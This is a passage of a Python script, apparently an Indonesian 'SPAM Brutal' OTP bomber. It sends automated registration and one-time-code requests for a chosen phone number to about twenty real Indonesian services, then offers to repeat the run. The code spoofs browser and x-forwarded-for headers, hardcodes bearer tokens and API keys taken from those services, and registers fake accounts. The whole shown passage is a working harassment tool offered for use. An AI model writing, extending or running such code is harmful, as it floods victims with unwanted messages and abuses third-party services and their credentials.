                              'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'Cache-Control': 'no-store, no-cache, must-revalidate', 'platform': '5', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://m.iuiga.id', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://m.iuiga.id/checkCode', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data='phone_code=%2B62&phone='+nomer+'&is_login=1&use_type=1').text
        time.sleep(1.5)
        Evermos = requests.post("https://evermos.com/ext-client/v3/user-verification/phone-registration", headers={'Host': 'evermos.com', 'Connection': 'keep-alive', 'Content-Length': '25', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'DNT': '1', 'client-device': 'web_mobile', 'sec-ch-ua-mobile': '?1', 'Authorization': 'Bearer 31dcdf6b8857174daa292239868c55ce6e531a5e', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
                                'x-forwarded-for': '10.0.23.159', 'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://evermos.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://evermos.com/registration/otp?source_link=GAds_SEM_EV_EVMBrand', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=json.dumps({"phone": "62"+nomer})).text
        time.sleep(1.5)
        PasarNow = requests.post("https://api.pasarnow.com/api/registerPasarnowUser", headers={'Host': 'api.pasarnow.com', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'Content-Type': 'application/json', 'Location': 'Jabodetabek',
                                 'Origin': 'https://www.pasarnow.com', 'Referer': 'https://www.pasarnow.com/'}, data=json.dumps({"first_name": "joshuwa", "last_name": "Aden", "gender": "male", "dob": "", "mobile_phone": "+62"+nomer, "referrer_mobile_phone": "", "mitra_suffix": "", "password": "Joshuwa123", "confirm_password": "Joshuwa123"})).text
        masuk = "Nomor tidak terdaftar"
        if masuk in PasarNow:
            PasarNow = requests.post("https://api.pasarnow.com/api/resendOTPCode", headers={'Host': 'api.pasarnow.com', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
                                     'Content-Type': 'application/json', 'Location': 'Jabodetabek', 'Origin': 'https://www.pasarnow.com', 'Referer': 'https://www.pasarnow.com/'}, data=json.dumps({"mobile_phone": "+62"+nomer, "send_type": "wa"})).text
            print(PasarNow)
        else:
            PasarNow = requests.post("https://api.pasarnow.com/api/resendOTPCode", headers={'Host': 'api.pasarnow.com', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
                                     'Content-Type': 'application/json', 'Location': 'Jabodetabek', 'Origin': 'https://www.pasarnow.com', 'Referer': 'https://www.pasarnow.com/'}, data=json.dumps({"mobile_phone": "+62"+nomer, "send_type": "wa"})).text
        time.sleep(1.5)
        Homecredit = requests.post("https://accounts.homecredit.co.id/credstore-fe/services/do/register?clientId=KpB3UVsfGaDUvwurVQTrbCsgpa5CUIgW", headers={'Host': 'accounts.homecredit.co.id', 'Connection': 'keep-alive', 'Content-Length': '135', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'DNT': '1', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*', 'X-Requested-With': 'XMLHttpRequest',
                                   'sec-ch-ua-platform': '"Android"', 'Origin': 'https://accounts.homecredit.co.id', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://accounts.homecredit.co.id/credstore-fe/services/register;jsessionid=C35YD569ry7ASb3i8ybFaoZ767jLqGvy_zIjxx8v21lJXhoBjw3C!-1704928993?clientId=KpB3UVsfGaDUvwurVQTrbCsgpa5CUIgW', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=("phone="+nomer+"&dateOfBirth=2001-04-09&pin=051001&otpResend=false&appsflyerId=&advertisingId=&browserFingerprint=iNbAMHtrrQCSXFOtbMT3")).text
        time.sleep(1.5)
        Kuncie = requests.post("https://api.kuncie.com/auth/v2/authenticate", headers={'Host': 'api.kuncie.com', 'Connection': 'keep-alive', 'Content-Length': '54', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/x-www-form-urlencoded', 'DNT': '1', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
                               'sec-ch-ua-platform': '"Android"', 'Originc': 'https://www.kuncie.com', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.kuncie.com/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=("type=phone&phoneNumber=%2B62"+nomer+"&clientType=web")).text
        time.sleep(1.5)
        Mncs = requests.get("https://api.partaiperindo.com/auth/otp?number=0"+nomer, headers={'Host': 'api.partaiperindo.com', 'Accept': 'application/json, text/plain, */*',
                            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'Origin': 'https://member.partaiperindo.com', 'Referer': 'https://member.partaiperindo.com/'}).text
        time.sleep(1.5)
        Fita = requests.post("https://api.munalively.com/graphql", headers={'Host': 'api.munalively.com', 'Connection': 'keep-alive', 'Content-Length': '167', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'request-from': 'fita-web', 'DNT': '1', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'content-type': 'application/json', 'accept': '*/*',
                             'sec-ch-ua-platform': '"Android"', 'Origin': 'https://fita.co.id', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://fita.co.id/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=json.dumps({"operationName": "getSMSLoginCode", "variables": {"mobile": "+62"+nomer}, "query": "query getSMSLoginCode($mobile: String!) {\n  getSMSLoginCode(mobile: $mobile)\n}"})).text
        time.sleep(1.5)
        Tada = requests.post("https://morinagaplatinum.com/api/tada/sign?lang=id", headers={'Host': 'morinagaplatinum.com', 'Connection': 'keep-alive', 'Content-Length': '27', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'DNT': '1', 'sec-ch-ua-mobile': '?1',
                             'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://morinagaplatinum.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://morinagaplatinum.com/id/masuk', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=("phone=0"+nomer+"&fprs_id=")).text
        time.sleep(1.5)
        Edot = requests.post("https://api.edot.id/api/retailer/simple_registration", headers={'Host': 'api.edot.id', 'Connection': 'keep-alive', 'Content-Length': '129', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'DNT': '1', 'Accept-Language': 'id-ID', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'Content-Type': 'application/json',
                             'nabati-token': 'EYzSLQgf9TRGFZvYBBz1B6hu4xpelSPq', 'sec-ch-ua-platform': '"Android"', 'Accept': '*/*', 'Origin': 'https://mitra.edot.id', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://mitra.edot.id/client', 'Accept-Encoding': 'gzip, deflate, br'}, data=json.dumps({"email": "joshuwa827@gmail.com", "telephone": nomer, "password": "Joshuwa123", "confirm_password": "Joshuwa123", "otp_type": "wa"})).text
        time.sleep(1.5)
        Relx = requests.post("https://ec-api.offlinesass.com/user/msg/send", headers={'Host': 'ec-api.offlinesass.com', 'Accept': 'application/json, text/javascript, */*', 'Content-Type': 'application/json',
                             'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'Origin': 'https://relxnow.co.id', 'Referer': 'https://relxnow.co.id/'}, data=json.dumps({"store": "id", "phone": "+62"+nomer, "type": "1", "channel": 0})).text
        time.sleep(1.5)
        Fd_network = requests.post("https://account.femaledaily.com/api", headers={'Host': 'account.femaledaily.com', 'Connection': 'keep-alive', 'Content-Length': '60', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'sec-ch-ua-platform': '"Android"', 'DNT': '1', 'endpoint': 'https://api.femaledaily.com/app/v2/send_code', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
                                   'content-type': 'application/json', 'device': '3', 'key': 'client03-TSbs94s3q5H9PP2yNPBr', 'version': '1.5', 'Accept': '*/*', 'Origin': 'https://account.femaledaily.com', 'Referer': 'https://account.femaledaily.com/register?url=https%3A%2F%2Ffemaledaily.com%2F', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=json.dumps({"auth_name": "62"+nomer, "channel": "sms", "type": "check"})).text
        time.sleep(1.5)
        OttenCoffe = requests.post("https://api.ottencoffee.co.id/v3/auth/register/code/request", headers={'Host': 'api.ottencoffee.co.id', 'Connection': 'keep-alive', 'Content-Length': '38', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'DNT': '1', 'sec-ch-ua-mobile': '?1', 'Authorization': 'Bearer xnG44Stf4hGb4jYsCl0QEVMjHQ4WJINbgpPfa2XHiL2d/aMyqqi7AlDdddWUva0VUNtFlcbGccqV4HLNOa/4n5v86ZOM9q0+fyqehhQf0rTCratNBE/pfV1gSrVAVnDZsm77/XjwXt8AKz8mWfPaD4YkSTcEl0DmdKYatNy9whN1pCELeKBVf9HTyF3K4eB0/jbsMcV7LXybm2Yich3bU5OUO9Q5o8sSIzPqIguMKhTyAPuUo4YfsT9Z/aMx8E2D3V+iS+dE7vN7tRQVnNHWT+IqT8SpEyEpQN0dnHNs1mKe3H18LBodEB2m2mcmMWPbkMllDU0Uj9p/GVavfLRJulpLaO7mc7bbyUHR2Q==',
                                   'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://ottencoffee.co.id', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://ottencoffee.co.id/register', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=json.dumps({"sentBy": "sms", "to": "+62"+nomer})).text
        time.sleep(1.5)
        MyValue = requests.post("https://auth.myvalue.id/v1/verification/send/", headers={'Host': 'auth.myvalue.id', 'Connection': 'keep-alive', 'Content-Length': '43', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
                                'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://auth.myvalue.id', 'Referer': 'https://auth.myvalue.id/authorize/register?client_id=MyValueWeb&redirect_uri=https%3A%2F%2Fwww.myvalue.id%2Fredirect&state=eNjUv67yihvE0'}, data=json.dumps({"username": "62"+nomer, "template": ""})).text
        time.sleep(1.5)
        SpeedWork = requests.post("https://speedwork.id.gtech.asia/graphql/?opname=sendSmsCode", headers={'Host': 'speedwork.id.gtech.asia', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'content-type': 'application/json', 'accept': '*/*', 'channelCode': 'SPEEDWORK','AUTH-TOKEN': 'null', 'Origin': 'https://capp.speedwork.id', 'Referer': 'https://capp.speedwork.id/'}, data=json.dumps({"operationName": "sendSmsCode", "variables": {"input": {"length": 6, "phone": nomer, "type": "1"}}, "query": "mutation sendSmsCode($input: SMSCodeInput!) {\n  sendSmsCode(input: $input) {\n    code\n    __typename\n  }\n}\n"})).text
        time.sleep(1.5)
        TipTip = requests.post("https://api.tiptip.co/user/guest/v1/otp/send", headers={"Host": "api.tiptip.co","User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36","Content-Type": "application/json","Channel-App-Version": "1.69.2","Channel-Device": "Chrome","Channel": "WEB","Channel-Fingerprint": "2776799531","Accept": "application/json","Origin": "https://tiptip.co","Referer": "https://tiptip.co/"}, data=json.dumps({"action": "SIGN_UP","delivery_method": "WA","username": "+62"+nomer})).text
        print(Panel("[green1]("+yes+")[white] SPAM Brutal Berhasil di kirim ==> "+"[yellow]0" +
              nomer+"[black] by Ismail Djaini", width=71, title="[green1]Status", style=f"bold"))
        hittung_mundur()
    again = input(
        f"{BOLD}╰─ {RED}(=) {WHITE}SPAM LAGI ? {RED}(y/n) {WHITE} => {BOLD}")
    if again == "y" or again == "Y":
        time.sleep(0.5)
        os.system("python main.py")
    elif again == "n" or again == "N":
        fast(f"{BOLD}╰─ {RED}(•) {WHITE}Terima Kasih Telah Menggunakan SC ini")
        time.sleep(1)
        sys.exit()
    else:
        fast(f"{BOLD}╰─ (•) Input Tidak Benar, Masukkan (y/n)")
        time.sleep(1)
        sys.exit()
        #! 46 OTP

#! KELUAR MENU
'''===== KELUAR MENU ====='''
if Menu == "5":
    mengetik(
        f"{BOLD}{WHITE}╰─ (>) Terima Kasih, Sampai Jumpa Lagi {RED}. {YELLOW}. {GREEN}. ")
    time.sleep(0.5)
    exit()
else:
    fast(f"{BOLD}╰─ (•) {WHITE}Input Tidak Benar, Pilih {RED}(1/2/3)")
    time.sleep(0.5)
    os.system("python main.py")